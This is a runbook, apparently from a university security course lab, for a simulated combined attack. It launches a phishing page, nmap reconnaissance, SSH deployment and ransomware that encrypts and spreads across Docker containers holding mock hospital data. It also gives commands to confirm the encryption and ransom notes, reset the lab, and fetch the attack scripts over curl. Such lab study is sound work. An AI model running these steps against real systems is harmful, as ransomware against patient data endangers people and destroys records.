# How to Run the Combined Attack
> Run everything from Kali, Ubuntu is the target.

---

## Prerequisites (one-time setup)

On **Kali**:
```bash
python3 -m pip install flask paramiko cryptography --break-system-packages
```

---

## Every Run

### 1 — Start the attack
```bash
cd ~/combined
python3 run_attack.py 172.16.63.128
```

### 2 — Phase 0 (Phishing)
Terminal will show:
```
➜  http://172.16.63.130:8080
```
Open the URL in a browser. Enter:
- Username: `ehradmin`
- Password: `Hospital2024!`

Click **Verify and Continue**. The attack carries on automatically.

### 3 — Watch it run
Phases run automatically after credentials are submitted:
- Phase 1 — nmap recon
- Phase 2 — SSH deploy
- Phase 3 — ransomware encrypts all 3 containers + propagates

### 4 — Verify the damage
```bash
ssh -p 2222 ehradmin@172.16.63.128 "ls /opt/hospital-data/"
ssh -p 2223 ehradmin@172.16.63.128 "ls /opt/hospital-data/"
ssh -p 2224 ehradmin@172.16.63.128 "ls /opt/hospital-data/"
```
All files should be `.enc` with a `RANSOM_NOTE.txt`.

---

## Reset the Lab

On **Ubuntu**:
```bash
cd ~/docker
docker compose down
docker compose up -d --build
```

---

## Update Files on Kali

from Terminal on device:
```bash
cd "/Users/yaseralharbi/Desktop/Masters/Sem 2/secutiryt and privacy/Virus-Simulation/SP-group28/attack"
python3 -m http.server 9000
```

On Kali pull what changed, e.g.:
```bash
curl -o ~/combined/phases/phase0_phishing.py http://172.16.63.1:9000/combined/phases/phase0_phishing.py
```
